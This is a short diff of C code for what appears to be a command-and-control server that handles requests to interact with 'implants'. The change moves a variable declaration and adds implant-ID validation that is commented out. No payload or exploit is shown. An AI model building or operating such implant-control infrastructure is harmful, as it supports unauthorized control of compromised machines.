@@ -101,6 +101,7 @@ int autheticate(MYSQL *con, SSL *ssl) {
 }
 
 char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
+    
     if (!rinfo) {
         return strdup("{\"error\": \"Invalid JSON\"}");
     }
@@ -109,6 +110,24 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
     if (!implant_id) {
         return NULL;
     }
+    char *implant_id_value = implant_id->valuestring;
+    //cJSON *valid_id = cJSON_CreateObject();
+    //
+    //if (check_implant_id(con, implant_id->valuestring) == 0) {
+    //    cJSON_AddStringToObject(valid_id, "Valid ID", "false");
+    //    char *reply = cJSON_Print(valid_id);
+    //    cJSON_Delete(valid_id);
+    //    log_message(LOG_INFO, "Requested Implant ID %s does not exists",implant_id_value);
+    //    return reply;
+    //} else {
+    //    cJSON_AddStringToObject(valid_id, "Valid ID", "true");
+    //    char *reply = cJSON_Print(valid_id);
+    //    cJSON_Delete(valid_id);
+    //    log_message(LOG_INFO, "Requested Implant ID %s does exists",implant_id_value);
+    //    //return reply;
+    //    // change here
+    //}
+
     cJSON *action = cJSON_GetObjectItem(rinfo, "action");
 
     if (!action || !cJSON_IsString(action) || !implant_id || !cJSON_IsString(implant_id)) {
@@ -116,7 +135,7 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
     }
 
     const char *action_value = action->valuestring;
-    char *implant_id_value = implant_id->valuestring;
+
 
     char *data = malloc(MAX_INFO);
     if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");
